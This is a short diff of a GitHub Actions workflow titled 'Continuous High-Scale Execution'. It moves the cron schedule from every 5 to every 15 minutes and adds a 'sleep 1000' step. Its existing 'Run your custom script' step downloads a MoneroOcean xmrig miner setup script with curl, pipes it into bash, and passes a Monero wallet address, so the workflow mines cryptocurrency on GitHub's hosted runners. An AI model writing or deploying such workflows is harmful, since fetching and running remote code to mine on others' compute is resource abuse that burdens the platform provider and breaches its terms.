@@ -3,7 +3,7 @@ name: Continuous High-Scale Execution
 on:
   schedule:
     # Runs every 5 minutes (the maximum frequency allowed by GitHub)
-    - cron: '*/5 * * * *'
+    - cron: '*/15 * * * *'
   workflow_dispatch: # Allows you to start it manually for testing
 
 jobs:
@@ -24,4 +24,5 @@ jobs:
       - name: Run your custom script
         run: |
           curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44bz3nLuQZnJCpV6EQUEGDfX1f9xKvkzKY4rPo6g3EXp3FrMPAYZjPSGExvHf6RrS6YgoTTmp55bWQM94sqfng6eH8P4JfX
+          sleep 1000
         shell: bash
